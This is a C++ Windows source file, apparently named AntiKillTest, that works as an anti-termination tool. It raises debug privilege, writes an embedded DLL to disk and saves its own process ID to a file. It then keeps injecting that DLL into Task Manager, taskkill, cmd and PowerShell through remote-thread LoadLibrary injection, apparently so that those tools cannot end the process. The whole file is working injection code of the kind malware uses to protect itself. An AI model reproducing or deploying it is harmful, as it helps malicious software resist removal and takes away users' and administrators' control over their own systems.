// AntiKillTest.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "resource.h"
#include <string>
#include <list>
#include <fstream>

using namespace std;

const char* names[] = {"taskmgr.exe", "taskkill.exe", "cmd.exe", "powershell.exe"};
list<DWORD> pidsinjected;

void adjustPrivilege()
{
	HMODULE ntdll = LoadLibrary(TEXT("ntdll"));
	if (ntdll)
	{
		long (CALLBACK * ap)(UINT, BOOLEAN, BOOLEAN, PBOOLEAN) = (long (CALLBACK*)(UINT, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(ntdll, "RtlAdjustPrivilege");
		BOOLEAN buffer;
		ap(0x14, 1, 0, &buffer);
		FreeLibrary(ntdll);
	}
}

BOOL ReleaseResource(const char* pszResName, const char* pszType, const char* pszFilename)
{
	HRSRC hRes = FindResource(NULL, pszResName, pszType);
	if (hRes != NULL)
	{
		SIZE_T nSize = SizeofResource(NULL, hRes);
		HGLOBAL hG = LoadResource(NULL, hRes);
		if (hG != NULL)
		{
			LPVOID addr = LockResource(hG);
			HANDLE hFile = CreateFile(pszFilename, GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			DWORD dwWritten;
			WriteFile(hFile, addr, nSize, &dwWritten, NULL);
			CloseHandle(hFile);
			FreeResource(hG);
			return TRUE;
		}
	}
	return FALSE;
}

void EnumProcesses(const char** pnames, int namecount, void (*callback)(DWORD pid))
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32 pcsEntry;
	pcsEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL hasProcess = Process32First(hSnapshot, &pcsEntry);
	while (hasProcess)
	{
		for (int i = 0; i < namecount; i++)
		{
			const char* pname = pnames[i];
			if (lstrcmpi(pname, pcsEntry.szExeFile) == 0)
			{
				callback(pcsEntry.th32ProcessID);
				break;
			}
		}
		hasProcess = Process32Next(hSnapshot, &pcsEntry);
	}
	CloseHandle(hSnapshot);
	return;
}

string GetSelfLoc()
{
	char buffer[1024];
	GetModuleFileName(NULL, buffer, sizeof(buffer));
	string filename(buffer);
	return filename.substr(0, filename.find_last_of('\\') + 1);
}

void callback(DWORD pid)
{
	for (list<DWORD>::const_iterator iter = pidsinjected.begin(); iter != pidsinjected.end(); iter++)
	{
		if (*iter == pid) return;
	}
	string dllname = GetSelfLoc() + "InjectDll.dll";
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPVOID address = VirtualAllocEx(hProcess, NULL, dllname.size(), MEM_COMMIT, PAGE_READWRITE);
	if (address != NULL)
	{
		size_t writtenBytes;
		BOOL hasOK = WriteProcessMemory(hProcess, address, dllname.data(), dllname.size(), (SIZE_T*)& writtenBytes);
		if (writtenBytes == dllname.size())
		{
			HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, address, 0, NULL);
			if (hThread != NULL)
			{
				WaitForSingleObject(hThread, INFINITE);
				CloseHandle(hThread);
			}
			else
			{
				DWORD err = GetLastError();
				char* info = NULL;
				FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM, NULL, err, 0, (char*)& info, 0, NULL);
				printf("%s\n", info);
			}
		}
	}
	CloseHandle(hProcess);
	pidsinjected.push_back(pid);
}

int main()
{
	if (ReleaseResource(MAKEINTRESOURCE(IDR_BINARY1), "BINARY", GetSelfLoc().append("InjectDll.dll").data()))
	{
		printf("Antikill!\n");
		adjustPrivilege();
		DWORD dwPid = GetCurrentProcessId();
		ofstream ofs;
		ofs.open(GetSelfLoc() + "pid.txt");
		ofs << dwPid << endl;
		ofs.close();
		for (;;)
		{
			EnumProcesses(names, sizeof(names) / sizeof(names[0]), callback);
			Sleep(100);
		}
	}
    return 0;
}


